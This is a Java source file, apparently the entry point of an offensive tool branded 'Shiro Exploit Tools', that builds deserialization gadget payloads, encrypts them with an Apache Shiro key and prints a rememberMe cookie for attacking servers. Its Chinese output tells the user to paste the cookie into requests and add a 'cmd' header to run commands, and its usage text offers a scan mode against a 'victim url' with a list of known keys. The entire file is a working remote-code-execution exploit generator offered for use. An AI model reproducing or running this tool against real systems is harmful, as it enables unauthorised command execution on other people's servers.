package org.unicodesec;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import yso.payloads.Serializer;
import yso.payloads.Strings;
import yso.payloads.annotation.Authors;
import yso.payloads.annotation.Dependencies;
import yso.payloads.exploitType.EXP;
import yso.payloads.gadgets.ObjectGadget;

import java.util.*;

public class GeneratePayload {

    public static void main(String[] args) {
        String text = "   _____   _       _                  ______          _               _______                   _       \n" +
                "  / ____| | |     (_)                |  ____|        | |             |__   __|                 | |      \n" +
                " | (___   | |__    _   _ __    ___   | |__      ___  | |__     ___      | |      ___     ___   | |  ___ \n" +
                "  \\___ \\  | '_ \\  | | | '__|  / _ \\  |  __|    / __| | '_ \\   / _ \\     | |     / _ \\   / _ \\  | | / __|\n" +
                "  ____) | | | | | | | | |    | (_) | | |____  | (__  | | | | | (_) |    | |    | (_) | | (_) | | | \\__ \\\n" +
                " |_____/  |_| |_| |_| |_|     \\___/  |______|  \\___| |_| |_|  \\___/     |_|     \\___/   \\___/  |_| |___/\n" +
                "                                                                                                        \n" +
                "                                                                  Powered by UnicodeSec                 \n" +
                "                                                                  Version  0.0.3                        ";
        System.out.println(text);
        if (args.length == 0) {
            printUsage();
            return;
        }
        final String key = args[0];
        if (Base64.decode(key).length != 16){
            System.out.println("密钥长度错误，aes加密中，密钥长度为16位");
        }
        final String payloadType = args[1];
        final String payloadServerType = args[2];

        final Class<? extends ObjectGadget> payloadClass = ObjectGadget.Utils.getPayloadClass(payloadType);
        final Class<? extends EXP> exploitClassClass = EXP.Utils.getPayloadClass(payloadServerType);

        try {
            final ObjectGadget payload = payloadClass.newInstance();
            final EXP exploitType = exploitClassClass.newInstance();
            final Object object = payload.getObject(exploitType);
            byte[] buf;
            if (!(object instanceof byte[])) {
                // jdk8u20 这个gadget因为比较特殊，返回的byte[]
                buf = Serializer.serialize(object);
            } else {
                buf = (byte[]) object;
            }
            String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
            System.out.println(String.format("Key: %s", key));
            System.out.println(String.format("Gadget: %s", payloadType));
            System.out.println(String.format("Exploit Type: %s", payloadServerType));
            System.out.println(String.format("payload length: %s", rememberMe.length()));
            System.out.println("请将下面的rememberMe复制到cookies中, 如果需要执行命令，请添加如下http头。建议删除http中ua等请求头以减小http header的大小，否则容易报400错误");
            System.out.println("\t\tcmd: command\n");
            System.out.println(String.format("rememberMe=%s", rememberMe));
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
        }
        System.exit(0);
    }

    private static void printUsage() {
        System.err.println("Powered by UnicodeSec Potatso");
        System.err.println("Exploit");
        System.err.println("Usage: java -jar shiroPoc-[version]-all.jar [key] [payload] [回显服务器类型]");
        System.err.println("Scan");
        System.err.println("Usage: java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url]");
        System.err.println("  Available shiro key:");

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"index", "key"});
        rows.add(new String[]{"---------------", "---------------"});
        for (int i = 0; i < keys.keys.length; i++) {
            rows.add(new String[]{
                    String.valueOf(i),
                    keys.keys[i],
            });
        }

        final List<String> lines = Strings.formatTable(rows);
        for (String line : lines) {
            System.err.println("     " + line);
        }
        getPayloadClasses();
        // get server
        getServerClasses();
    }

    private static void getPayloadClasses() {
        System.err.println();
        System.err.println("  Available payload types:");
        final List<Class<? extends ObjectGadget>> payloadClasses =
                new ArrayList<Class<? extends ObjectGadget>>(ObjectGadget.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectGadget> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }

    private static void getServerClasses() {
        System.err.println();
        System.err.println("  Available Exploit types:");
        final List<Class<? extends EXP>> payloadClasses =
                new ArrayList<Class<? extends EXP>>(EXP.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends EXP> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", ""),
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }

}
